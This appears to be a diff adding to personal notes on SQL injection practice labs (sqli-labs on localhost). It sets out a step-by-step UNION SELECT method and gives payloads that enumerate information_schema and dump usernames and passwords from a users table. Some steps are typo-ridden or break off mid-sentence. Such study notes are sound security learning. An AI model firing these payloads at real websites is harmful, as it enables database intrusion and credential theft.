@@ -21,6 +21,16 @@ This is a simple login webpage. I tried to enter the username as `administrator'
 ## UNION ATTACK
 In this we try to breach the usernames and passwords from the backend database. first we check the number of columns containg strings by the payload `' union select 'username','password'--+`. This should print the texts username and password indicating there are 2 columns which columns contain text data. So we make our final payload as `' union select username,password from users --+` which selects both the columns.
 ## SQLI LABS
+
+### GENERAL APPROACH
+1)	First we can check for possible sql injections using `‘`and `‘’`
+2)	Then we fuzz around trying to get the syntax of the code
+3)	Then we try to make the first statement false by providing something like id=-1. Since we know id is not generally negative. 
+4)	We have done this to use the UNION SELECT statement. So if the first one is false so will be the 
+5)	`localhost/sqli-labs/Less-1/?id=-1' UNION SELECT ‘a’,'b',database()--+` doing this will get us the name of the database
+6)	Then we can type `localhost/sqli-labs/Less-1/?id=' union select NULL,NULL,column_name from information_schema.columns where  table_schema=database() and table_name='users' limit 0,1--+`
+7)	To domp all the data from those sql databases.
+
 ### LAB 1
 `?id=-1’ union select 1,group_concat(username),group_concat(password) from users --+` to break the code
 ### LAB 2
